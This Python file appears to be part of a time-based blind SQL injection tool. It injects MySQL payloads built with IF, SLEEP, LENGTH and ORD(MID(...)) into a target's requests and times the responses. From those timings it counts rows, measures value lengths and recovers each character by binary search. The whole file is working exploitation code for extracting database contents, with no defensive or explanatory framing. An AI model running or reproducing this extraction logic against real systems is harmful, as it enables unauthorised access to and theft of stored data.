import string
import math

from getdb_util import *

def find_num_row(my_attack, query_num_row):
	i=0;
	res_time=0.00
	while( res_time < my_attack.sleep_time ):
	
		tmp_payload = " AND IF((%s)=%d, SLEEP(%g), SLEEP(0))" % ( query_num_row, i , my_attack.sleep_time )
		res = request(my_attack, tmp_payload)
		res_time = res.elapsed.total_seconds()
	
		i=i+1

	num_rows = i-1
	return num_rows

def find_value_length(row_index, my_attack, query_value_length):
	i=0;
	res_time=0.00
	while( res_time < my_attack.sleep_time ):
	
		tmp_payload = " AND IF(LENGTH((%s LIMIT %d,1))=%d, SLEEP(%g), SLEEP(0))" % ( query_value_length, row_index, i , my_attack.sleep_time )
		res = request(my_attack, tmp_payload)
		res_time = res.elapsed.total_seconds()
	
		i=i+1

	word_length = i-1
	return word_length


################################
# BINARY SEARCH ON SINGLE CHAR #
################################
def compare(my_attack, query_schema_names, row_index, char_index, mid, operator):
	tmp_payload = " AND IF(ORD(MID((%s LIMIT %d,1) ,%d,1))%s%d , SLEEP(%g) , SLEEP(0) )" % (query_schema_names, row_index, char_index, operator, mid, my_attack.sleep_time)
	res = request(my_attack, tmp_payload)
		
	if(res.elapsed.total_seconds() >= my_attack.sleep_time):
		return True
	else:
		return False
		
	
	
def search_value( print_ascii, lo, hi, char_index, my_attack, query_schema_names, row_index ):

	if( lo > hi ) :
		print("CHARACTER NOT FOUND! look at |_| in results!")
		return False
	
	mid=math.floor((lo+hi)/2)
	
	if(compare( my_attack, query_schema_names, row_index, char_index, print_ascii[mid], "=" )):
		return print_ascii[mid]

	elif(compare( my_attack, query_schema_names, row_index, char_index, print_ascii[mid], "<" )):
		return search_value(print_ascii, lo, mid-1, char_index, my_attack, query_schema_names, row_index)

	elif(compare( my_attack, query_schema_names, row_index, char_index, print_ascii[mid], ">" )):
		return search_value(print_ascii, mid+1, hi, char_index,  my_attack, query_schema_names, row_index)
	
	else:
		print("CONNECTION ERROR DURING THE BINARY SEARCH!!! I'm trying to retrieve the character!")
		return search_value( print_ascii, lo, hi, char_index, my_attack, query_schema_names, row_index )


##########################
# SEARCH FOR VALUES      #
##########################

def get_values( my_attack, printable_ascii, num_row, query):
	found_values_list = []
	for row_index in range(num_row):
		
		value=''
		
		value_length = find_value_length(row_index, my_attack, query)
		
		for char_index in range(1,(value_length+1)):
			
			found_char = search_value( printable_ascii, 0, len(printable_ascii)-1, char_index, my_attack, query, row_index )
			
			if( found_char == None ):
				print('RECURSION ERROR!')
				found_char='|_|'
				value = value + found_char
			elif(not found_char):
				found_char='|_|'
				value = value + found_char
			else:	 
				value = value + chr(found_char)
		found_values_list.insert(row_index, value)
	return found_values_list

